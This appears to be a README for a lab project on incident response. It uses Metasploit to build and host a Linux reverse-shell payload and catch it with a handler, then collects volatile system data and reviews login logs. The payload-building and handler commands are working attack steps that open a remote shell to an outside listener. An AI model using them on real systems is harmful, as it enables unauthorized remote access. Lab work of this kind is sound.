# Incident Response Procedures

## Overview
This project simulates an incident response workflow by building malicious executables, collecting volatile data, and analyzing system logs. Tools like Metasploit and Linux commands are used to identify, mitigate, and document activities on compromised systems.

## Key Features
1. **Malicious Executable Creation**:
   - Use Metasploit to create a reverse shell payload for Linux systems.
   - Host the payload via an HTTP server for remote execution.
2. **Volatile Data Collection**:
   - Gather critical data (RAM, network stats, processes) before shutdown.
   - Save findings in a structured report for analysis.
3. **Log Analysis**:
   - Examine system logs (`auth.log`, `btmp`, `wtmp`) to identify unauthorized access or failed login attempts.

## Lab Steps
1. **Create a Malicious Payload**:
   - Build a reverse shell payload:
     ```bash
     msfconsole
     search linux/x64/shell_reverse_tcp
     use 0
     set LHOST 203.0.113.2
     generate -f elf -o linux
     ```
   - Host it via HTTP:
     ```bash
     python3 -m http.server
     ```
   - Start a Metasploit handler:
     ```bash
     use exploit/multi/handler
     set payload linux/x64/shell_reverse_tcp
     exploit
     ```

2. **Collect Volatile Data**:
   - Create a report and collect system data:
     ```bash
     echo sysadmin investigator > report.txt
     date >> report.txt
     uname -a >> report.txt
     hostname >> report.txt
     ifconfig -a >> report.txt
     netstat -ano >> report.txt
     ps -aux >> report.txt
     route -n >> report.txt
     date >> report.txt
     ```
   - View the report:
     ```bash
     cat report.txt | less
     ```

3. **Analyze Logs**:
   - Review logs for suspicious activity:
     ```bash
     cat /var/log/auth.log | less
     last -f /var/log/btmp | more
     last -f /var/log/wtmp | more
     ```

## Tools Used
- **Metasploit Framework**: For creating payloads and managing reverse connections.
- **Linux Commands**: For collecting volatile data and log analysis.
- **Python HTTP Server**: For hosting malicious executables.

## Learning Objectives
- Understand reverse shell creation and execution.
- Collect and document volatile data from compromised systems.
- Analyze system logs to identify unauthorized activities.

## Documentation
Refer to the [Incident Response Procedures](https://github.com/StephVergil/Incident-Response-Procedures/blob/main/Incident%20Reponse%20Procedures.docx)
